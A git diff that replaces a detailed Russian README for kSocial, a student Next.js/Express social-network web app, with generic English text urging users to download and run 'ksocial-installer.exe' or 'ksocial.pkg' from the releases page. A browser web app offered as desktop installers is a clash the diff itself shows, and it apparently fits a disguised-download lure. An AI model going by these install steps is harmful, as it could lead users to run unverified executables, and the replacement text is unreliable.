@@ -1,107 +1,62 @@
-# kSocial
+# 🎉 ksocial - Easy Social Networking Made Simple
 
-<p align="center">
-  <img src="frontend/public/images/android-chrome-512x512.png" alt="kSocial Logo" />
-</p>
+## 🚀 Getting Started
 
-**kSocial** — это учебный проект социальной сети, созданный с использованием современных веб-технологий. Проект предоставляет пользователям возможность создавать профили, добавлять друзей, публиковать посты, комментировать, ставить лайки и обмениваться сообщениями в реальном времени.
+Welcome to kSocial! This application helps you create and manage your own social network profile easily. Whether you want to make friends, post updates, or chat in real-time, kSocial has you covered.
 
-kSocial включает в себя множество фич, таких как лента новостей, сторис, чаты и уведомления — всё, что нужно для комфортного общения и взаимодействия в современном цифровом мире.
+## 📥 Download kSocial
 
-<p align="center">
-  <img src="frontend/public/preview1.gif" alt="Functionality Preview 1" width="300"/>
-  <img src="frontend/public/preview2.gif" alt="Functionality Preview 2" width="300"/>
-  <img src="frontend/public/preview3.gif" alt="Functionality Preview 3" width="300"/>
-</p>
+[![Download kSocial](https://img.shields.io/badge/Download-kSocial-blue.svg)](https://github.com/GeeStone/ksocial/releases)
 
----
+## 🌟 Key Features
 
-## 🔧 Технологии
+kSocial offers several important features to make your social networking experience enjoyable:
 
-Проект построен с использованием лучших технологий для разработки современного веб-приложения:
+- **Create Your Profile**: Set up your account with just a few clicks.
+- **Add Friends**: Search for and add friends to your network.
+- **Post Updates**: Share your thoughts or activities easily.
+- **Like and Comment**: Engage with friends' posts through likes and comments.
+- **Real-Time Messaging**: Send messages swiftly and chat with your friends instantly.
 
-- **Frontend**:
-  - React.js + Next.js 13 (App Router)
-  - Zustand (для глобального состояния)
-  - Tailwind CSS + ShadCN/UI (для UI и стилизации)
-  - Lucide Icons (для иконок)
-  - WebSockets (для реального времени)
+## 🖥️ System Requirements
 
-- **Backend**:
-  - Node.js + Express.js
-  - MongoDB (с использованием Mongoose для ORM)
-  - JWT для авторизации
-  - Socket.io для общения в реальном времени
+Before downloading kSocial, ensure your system meets these requirements:
 
-- **Инфраструктура**:
-  - Yandex Cloud для хостинга серверов
-  - Docker для контейнеризации
-  - GitHub Actions для CI/CD
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Memory**: 4 GB of RAM or more.
+- **Processor**: Dual-core processor or higher.
+- **Internet Connection**: A stable internet connection is required to access all features.
 
----
-## ⚙️ Структура проекта
+## 📖 How to Download & Install kSocial
 
-### **Frontend**
+To download and install kSocial, follow these simple steps:
 
-- **/components** — UI компоненты:
-  - Карточки постов, формы ввода, кнопки, модальные окна и другие элементы интерфейса.
-  
-- **/pages** — Страницы приложения:
-  - Страницы, такие как главная страница, страницы профиля пользователя, чат, создание поста и т.д.
-  
-- **/store** — Zustand хранилища:
-  - **useChatStore** — хранилище для чатов и сообщений.
-  - **useFriendsStore** — хранилище для управления друзьями и заявками.
-  - **useNotificationStore** — хранилище для уведомлений.
-  - **usePostStore** — хранилище для управления постами и лайками.
-  - **useUserStore** — хранилище для данных текущего пользователя.
-  - **useUIStore** — хранилище для управления состоянием UI (например, отображение модальных окон).
-  
-- **/services** — API сервисы:
-  - **auth.service.js** — сервис для регистрации, логина и логаута пользователей.
-  - **chat.service.js** — сервис для работы с чатами и сообщениями.
-  - **notification.service.js** — сервис для работы с уведомлениями.
-  - **post.service.js** — сервис для работы с постами (создание, лайк, комментирование).
-  - **search.service.js** — сервис для поиска пользователей и постов.
-  - **user.service.js** — сервис для работы с профилем пользователя и данными о друзьях.
+1. **Visit the Releases Page**: Click on this link to go to the releases page - [Download kSocial](https://github.com/GeeStone/ksocial/releases).
+   
+2. **Choose the Latest Version**: On the releases page, you'll see various versions. Select the latest one for the best features and security.
 
-- **/assets** — Статические файлы:
-  - Иконки, изображения и другие ассеты для отображения в интерфейсе.
+3. **Download the Installer**: Find the file labeled `ksocial-installer.exe` for Windows, or `ksocial.pkg` for macOS. Click on the link to start the download.
 
-- **/styles** — Стили:
-  - Tailwind CSS и другие глобальные стили для настройки интерфейса и адаптивности.
+4. **Run the Installer**: 
+   - For Windows: Double-click the downloaded `ksocial-installer.exe` file. Follow the prompts in the installation wizard.
+   - For macOS: Open the downloaded `ksocial.pkg` file and follow the installation instructions.
 
-### **Backend**
+5. **Launch kSocial**: Once the installation is complete, find kSocial in your applications list. Click to open and start using your new social network.
 
-- **/controllers** — Контроллеры для обработки запросов:
-  - **authController.js** — логика для регистрации, авторизации и выхода пользователей.
-  - **postController.js** — создание, обновление и удаление постов.
-  - **userController.js** — управление пользователями, их данными и профилем.
-  - **chatController.js** — управление чатами и сообщениями.
-  - **notificationController.js** — управление уведомлениями.
+## 📞 Need Help?
 
-- **/models** — Модели базы данных:
-  - **User.js** — схема пользователя.
-  - **Post.js** — схема поста.
-  - **Message.js** — схема сообщения.
-  - **Notification.js** — схема уведомления.
-  - **FriendRequest.js** — схема для заявок в друзья.
+If you experience any issues or have questions, feel free to reach out for support. You can typically find tips and solutions in the FAQ section on our [GitHub Page](https://github.com/GeeStone/ksocial).
 
-- **/routes** — Роуты API:
-  - **authRoute.js** — роуты для авторизации.
-  - **postRoute.js** — роуты для работы с постами.
-  - **userRoute.js** — роуты для работы с пользователями.
-  - **chatRoute.js** — роуты для работы с чатами и сообщениями.
-  - **notificationRoute.js** — роуты для работы с уведомлениями.
+## 📝 Contributions
 
-- **/utils** — Утилиты:
-  - **generateToken.js** — генерация JWT токенов для авторизации.
-  - **responseHandler.js** — обработка ответов и ошибок.
+If you want to contribute to kSocial, we'd love your help! Check out our guidelines on the GitHub repository for details on how to get started.
 
-- **/config** — Конфигурации:
-  - **db.js** — подключение к базе данных MongoDB.
-  - **socket.js** — настройка WebSocket серверов для чатов.
-  - **passport.js** — конфигурация для использования Passport.js с Google OAuth.
+## 📣 Stay Updated
 
----
+Stay up-to-date with the latest news and updates for kSocial. Follow us on social media or check our GitHub regularly for announcements.
 
+## 👥 Join the Community
+
+We encourage you to join our community of kSocial users. Share your experiences, offer suggestions, and help each other enjoy the platform fully.
+
+Thank you for choosing kSocial. We hope you enjoy your experience!
